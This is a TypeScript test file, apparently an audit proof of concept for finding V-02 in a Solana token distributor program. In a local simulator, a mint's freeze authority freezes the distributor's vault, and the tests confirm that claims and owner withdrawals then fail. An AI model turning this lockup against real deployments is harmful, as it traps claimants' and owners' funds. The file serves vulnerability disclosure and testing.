// V-02 PoC — FreezeAuthority Vault Lockup
//
// The distributor program enforces no constraint on the token_mint's freeze_authority.
// Any mint whose freeze_authority is non-null allows an external party to freeze the
// vault token account. A frozen vault causes all claim() and withdraw() CPIs to fail.
//
// This PoC uses a plain SPL Token mint to demonstrate that the vulnerability is NOT
// limited to Token-2022; any mint (SPL Token or Token-2022) with a live freeze_authority
// is affected.
//
// Run:
//   cd lib/boost-tokendistributor-solana
//   anchor build
//   npm install --legacy-peer-deps
//   ./node_modules/.bin/ts-mocha -t 60000 tests/poc_v02_freeze_authority.ts

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { TokenDistributor } from "../target/types/token_distributor";
import {
  TOKEN_PROGRAM_ID,
  createInitializeMintInstruction,
  createInitializeAccountInstruction,
  createMintToInstruction,
  createFreezeAccountInstruction,
  getAccount,
} from "@solana/spl-token";
import { LiteSVM } from "litesvm";
import {
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import * as fs from "fs";
import * as crypto from "crypto";
import { assert } from "chai";

// ── Constants ─────────────────────────────────────────────────────────────────
const DISTRIBUTOR_SEED = "distributor";
const OWNER_NONCE_SEED = "owner_nonce";
const VAULT_SEED       = "vault";
const CLAIM_SEED       = "claim";

const NOMINAL_AMOUNT = 1000n;
const DECIMALS       = 0;
const MINT_SIZE      = 82;   // SPL Token mint account size
const ACCOUNT_SIZE   = 165;  // SPL Token token account size

// ── LiteSVM helpers ───────────────────────────────────────────────────────────
function advanceSlot(svm: LiteSVM): void {
  const clock = svm.getClock();
  clock.slot += 1n;
  svm.setClock(clock);
}

function sendTx(
  svm: LiteSVM,
  feePayer: Keypair,
  tx: Transaction,
  signers: Keypair[],
): unknown {
  advanceSlot(svm);
  tx.recentBlockhash = svm.latestBlockhash();
  tx.feePayer = feePayer.publicKey;
  tx.sign(...signers);
  return svm.sendTransaction(tx);
}

function isFailure(result: unknown): boolean {
  const s = String(result);
  return (
    s.includes("FailedTransactionMetadata") ||
    s.includes("TransactionError") ||
    (s !== "undefined" && s.includes("Error"))
  );
}

class LiteSVMConnection {
  private readonly svm: LiteSVM;
  constructor(svm: LiteSVM) {
    this.svm = svm;
  }
  async getLatestBlockhash() {
    return { blockhash: this.svm.latestBlockhash(), lastValidBlockHeight: 0 };
  }
  async getMinimumBalanceForRentExemption() {
    return 0;
  }
  async getAccountInfo(pubkey: PublicKey) {
    const account = this.svm.getAccount(pubkey);
    if (!account) return null;
    return {
      executable: account.executable,
      owner: account.owner,
      lamports: Number(account.lamports),
      data: Buffer.from(account.data),
      rentEpoch: 0,
    };
  }
  async getAccountInfoAndContext(pubkey: PublicKey) {
    return {
      context: { slot: Number(this.svm.getClock().slot) },
      value: await this.getAccountInfo(pubkey),
    };
  }
  async getMultipleAccountsInfo(pubkeys: PublicKey[]) {
    return Promise.all(pubkeys.map((p) => this.getAccountInfo(p)));
  }
}

// ── SPL Token helpers ─────────────────────────────────────────────────────────

// Creates a plain SPL Token mint with freeze_authority set.
function createFreezeableMint(
  svm:       LiteSVM,
  payer:     Keypair,
  mintAuth:  PublicKey,
  freezeAuth: PublicKey,
): Keypair {
  const mint = Keypair.generate();
  const tx = new Transaction().add(
    SystemProgram.createAccount({
      fromPubkey:       payer.publicKey,
      newAccountPubkey: mint.publicKey,
      lamports:         5_000_000,
      space:            MINT_SIZE,
      programId:        TOKEN_PROGRAM_ID,
    }),
    createInitializeMintInstruction(
      mint.publicKey,
      DECIMALS,
      mintAuth,
      freezeAuth, // ← freeze_authority is set; program never checks this
    ),
  );
  sendTx(svm, payer, tx, [payer, mint]);
  return mint;
}

function createSplTokenAccount(
  svm:   LiteSVM,
  mint:  PublicKey,
  owner: PublicKey,
  payer: Keypair,
): Keypair {
  const account = Keypair.generate();
  const tx = new Transaction().add(
    SystemProgram.createAccount({
      fromPubkey:       payer.publicKey,
      newAccountPubkey: account.publicKey,
      lamports:         5_000_000,
      space:            ACCOUNT_SIZE,
      programId:        TOKEN_PROGRAM_ID,
    }),
    createInitializeAccountInstruction(account.publicKey, mint, owner),
  );
  sendTx(svm, payer, tx, [payer, account]);
  return account;
}

function merkleLeaf(claimant: PublicKey, amount: bigint): Buffer {
  const amtBuf = Buffer.alloc(8);
  amtBuf.writeBigUInt64LE(amount);
  return crypto
    .createHash("sha256")
    .update(Buffer.concat([claimant.toBuffer(), amtBuf]))
    .digest();
}

// ── Test suite ────────────────────────────────────────────────────────────────
describe("token_distributor — V-02 FreezeAuthority vault lockup", () => {
  let svm:        LiteSVM;
  let program:    Program<TokenDistributor>;
  let programId:  PublicKey;
  let connection: LiteSVMConnection;

  let owner:     Keypair;
  let operator:  Keypair;
  let claimant:  Keypair;
  let freezeAuth: Keypair; // holds freeze authority over the mint

  let mint:        Keypair;
  let ownerAta:    Keypair;
  let claimantAta: Keypair;

  let ownerNoncePda:     PublicKey;
  let distributorPda:    PublicKey;
  let vaultPda:          PublicKey;
  let claimStatusPda:    PublicKey;
  let eventAuthorityPda: PublicKey;

  before(async () => {
    svm = new LiteSVM();
    const programBytes = fs.readFileSync("./target/deploy/token_distributor.so");
    const idl = JSON.parse(
      fs.readFileSync("./target/idl/token_distributor.json", "utf8"),
    );
    programId = new PublicKey(idl.address);
    svm.addProgram(programId, programBytes);

    owner     = Keypair.generate();
    operator  = Keypair.generate();
    claimant  = Keypair.generate();
    freezeAuth = Keypair.generate(); // could be a stablecoin issuer, or the token's project team

    svm.airdrop(owner.publicKey,      BigInt(100 * LAMPORTS_PER_SOL));
    svm.airdrop(operator.publicKey,   BigInt(LAMPORTS_PER_SOL));
    svm.airdrop(claimant.publicKey,   BigInt(LAMPORTS_PER_SOL));
    svm.airdrop(freezeAuth.publicKey, BigInt(LAMPORTS_PER_SOL));

    // Mint created with freeze_authority. The program never checks this field.
    mint = createFreezeableMint(
      svm,
      owner,
      owner.publicKey,       // mint authority
      freezeAuth.publicKey,  // freeze authority
    );
    ownerAta    = createSplTokenAccount(svm, mint.publicKey, owner.publicKey,    owner);
    claimantAta = createSplTokenAccount(svm, mint.publicKey, claimant.publicKey, owner);

    sendTx(svm, owner, new Transaction().add(
      createMintToInstruction(
        mint.publicKey,
        ownerAta.publicKey,
        owner.publicKey,
        Number(NOMINAL_AMOUNT),
      ),
    ), [owner]);

    connection = new LiteSVMConnection(svm);
    const provider = new anchor.AnchorProvider(
      connection as any,
      new anchor.Wallet(owner),
      { commitment: "processed" },
    );
    program = new anchor.Program(idl as anchor.Idl, provider) as Program<TokenDistributor>;

    [ownerNoncePda] = PublicKey.findProgramAddressSync(
      [Buffer.from(OWNER_NONCE_SEED), owner.publicKey.toBuffer()],
      programId,
    );
    const nonceBuf = new anchor.BN(1).toArrayLike(Buffer, "le", 4);
    [distributorPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from(DISTRIBUTOR_SEED),
        mint.publicKey.toBuffer(),
        owner.publicKey.toBuffer(),
        nonceBuf,
      ],
      programId,
    );
    [vaultPda] = PublicKey.findProgramAddressSync(
      [Buffer.from(VAULT_SEED), distributorPda.toBuffer()],
      programId,
    );
    [claimStatusPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from(CLAIM_SEED),
        distributorPda.toBuffer(),
        claimant.publicKey.toBuffer(),
      ],
      programId,
    );
    [eventAuthorityPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("__event_authority")],
      programId,
    );
  });

  // ── Test 1: program accepts the mint without checking freeze_authority ────────
  it("create_distributor accepts SPL Token mint with live freeze_authority", async () => {
    const ix = await program.methods
      .createDistributor(new anchor.BN(NOMINAL_AMOUNT.toString()))
      .accounts({
        ownerNonce:        ownerNoncePda,
        distributor:       distributorPda,
        tokenVault:        vaultPda,
        tokenMint:         mint.publicKey,
        ownerTokenAccount: ownerAta.publicKey,
        owner:             owner.publicKey,
        operator:          operator.publicKey,
        systemProgram:     SystemProgram.programId,
        tokenProgram:      TOKEN_PROGRAM_ID,
        rent:              anchor.web3.SYSVAR_RENT_PUBKEY,
        eventAuthority:    eventAuthorityPda,
        program:           programId,
      })
      .instruction();

    const result = sendTx(svm, owner, new Transaction().add(ix), [owner]);
    assert.isFalse(isFailure(result), `create_distributor must succeed: ${result}`);

    const vault = await getAccount(connection as any, vaultPda, undefined, TOKEN_PROGRAM_ID);
    assert.equal(vault.amount.toString(), NOMINAL_AMOUNT.toString(), "vault holds 1000 tokens");
    assert.isFalse(vault.isFrozen, "vault is not yet frozen");

    console.log("  ✔ create_distributor accepted mint with freeze_authority — no runtime rejection");
    console.log(`  vault.amount  = ${vault.amount}`);
    console.log(`  vault.isFrozen = ${vault.isFrozen}`);
  });

  // ── Test 2: freeze_authority freezes the vault ────────────────────────────────
  it("freeze_authority freezes the vault — standard FreezeAccount instruction", async () => {
    // Operator sets up distribution so the claim timing checks will pass
    const leaf = merkleLeaf(claimant.publicKey, NOMINAL_AMOUNT);
    sendTx(svm, operator, new Transaction().add(
      await program.methods
        .setMerkleRoot(Array.from(leaf))
        .accounts({ distributor: distributorPda, operator: operator.publicKey, eventAuthority: eventAuthorityPda, program: programId })
        .instruction(),
    ), [operator]);

    const clock     = svm.getClock();
    const startTime = Number(clock.unixTimestamp) + 5;
    sendTx(svm, operator, new Transaction().add(
      await program.methods
        .setTime(new anchor.BN(startTime))
        .accounts({ distributor: distributorPda, operator: operator.publicKey, eventAuthority: eventAuthorityPda, program: programId })
        .instruction(),
    ), [operator]);

    // Advance clock into active distribution window
    const activeClock = svm.getClock();
    activeClock.unixTimestamp = BigInt(startTime + 1);
    activeClock.slot += 1n;
    svm.setClock(activeClock);

    // ATTACK: freeze authority freezes the vault. This is a plain SPL Token instruction —
    // it requires only the freeze authority's signature, not the program's.
    const freezeIx = createFreezeAccountInstruction(
      vaultPda,              // target: the distributor's vault
      mint.publicKey,
      freezeAuth.publicKey,  // signer: freeze authority
    );
    const freezeResult = sendTx(svm, freezeAuth, new Transaction().add(freezeIx), [freezeAuth]);
    assert.isFalse(isFailure(freezeResult), `freeze must succeed: ${freezeResult}`);

    const vault = await getAccount(connection as any, vaultPda, undefined, TOKEN_PROGRAM_ID);
    assert.isTrue(vault.isFrozen, "vault must be frozen");
    assert.equal(vault.amount.toString(), NOMINAL_AMOUNT.toString(), "tokens are still in vault");

    console.log("  ✔ vault frozen by freeze_authority");
    console.log(`  vault.isFrozen = ${vault.isFrozen}, vault.amount = ${vault.amount}`);
  });

  // ── Test 3: claim fails — transfer_checked from frozen vault is rejected ─────
  it("claim() fails after vault is frozen — all claimants permanently blocked", async () => {
    const claimIx = await program.methods
      .claim(new anchor.BN(NOMINAL_AMOUNT.toString()), [])
      .accounts({
        distributor:          distributorPda,
        claimStatus:          claimStatusPda,
        tokenVault:           vaultPda,
        claimantTokenAccount: claimantAta.publicKey,
        tokenMint:            mint.publicKey,
        claimant:             claimant.publicKey,
        systemProgram:        SystemProgram.programId,
        tokenProgram:         TOKEN_PROGRAM_ID,
        eventAuthority:       eventAuthorityPda,
        program:              programId,
      })
      .instruction();

    let claimFailed = false;
    let claimResult: unknown;
    try {
      claimResult = sendTx(svm, claimant, new Transaction().add(claimIx), [claimant]);
      if (isFailure(claimResult)) claimFailed = true;
    } catch (e) {
      claimFailed = true;
      claimResult = e;
    }

    assert.isTrue(claimFailed, `claim must fail on frozen vault; result: ${claimResult}`);

    const claimantAcct = await getAccount(
      connection as any, claimantAta.publicKey, undefined, TOKEN_PROGRAM_ID,
    );
    assert.equal(claimantAcct.amount.toString(), "0", "claimant received 0 tokens");

    console.log("  ✔ claim reverted — transfer_checked on frozen source fails");
    console.log(`  revert: ${String(claimResult).slice(0, 120)}`);
    console.log("  claimant received: 0 tokens (vault frozen, no recovery path in program)");
  });

  // ── Test 4: withdraw fails — owner also cannot recover the locked tokens ──────
  it("withdraw() fails after vault is frozen — owner cannot recover tokens either", async () => {
    // Advance clock past end_time so the DistributionNotEnded guard passes;
    // the subsequent transfer_checked still fails with AccountFrozen.
    const distributorState = await program.account.tokenDistributor.fetch(distributorPda);
    const pastEnd = svm.getClock();
    pastEnd.unixTimestamp = BigInt(Number(distributorState.endTime) + 1);
    pastEnd.slot += 1n;
    svm.setClock(pastEnd);

    const ownerPreBalance = (
      await getAccount(connection as any, ownerAta.publicKey, undefined, TOKEN_PROGRAM_ID)
    ).amount;

    const withdrawIx = await program.methods
      .withdraw()
      .accounts({
        distributor:       distributorPda,
        tokenVault:        vaultPda,
        tokenMint:         mint.publicKey,
        ownerTokenAccount: ownerAta.publicKey,
        owner:             owner.publicKey,
        tokenProgram:      TOKEN_PROGRAM_ID,
        eventAuthority:    eventAuthorityPda,
        program:           programId,
      })
      .instruction();

    let withdrawFailed = false;
    let withdrawResult: unknown;
    try {
      withdrawResult = sendTx(svm, owner, new Transaction().add(withdrawIx), [owner]);
      if (isFailure(withdrawResult)) withdrawFailed = true;
    } catch (e) {
      withdrawFailed = true;
      withdrawResult = e;
    }

    assert.isTrue(withdrawFailed, `withdraw must fail on frozen vault; result: ${withdrawResult}`);

    const ownerPostBalance = (
      await getAccount(connection as any, ownerAta.publicKey, undefined, TOKEN_PROGRAM_ID)
    ).amount;
    assert.equal(
      ownerPostBalance.toString(),
      ownerPreBalance.toString(),
      "owner's balance unchanged — withdraw reverted atomically",
    );

    const vault = await getAccount(connection as any, vaultPda, undefined, TOKEN_PROGRAM_ID);
    assert.equal(vault.amount.toString(), NOMINAL_AMOUNT.toString(), "vault still holds tokens");

    console.log("  ✔ withdraw reverted — owner cannot recover tokens from frozen vault");
    console.log(`  revert: ${String(withdrawResult).slice(0, 120)}`);
    console.log(`  vault still locked: ${vault.amount} tokens`);
    console.log("  recovery path: thaw the vault externally (requires freeze_authority cooperation)");
  });
});
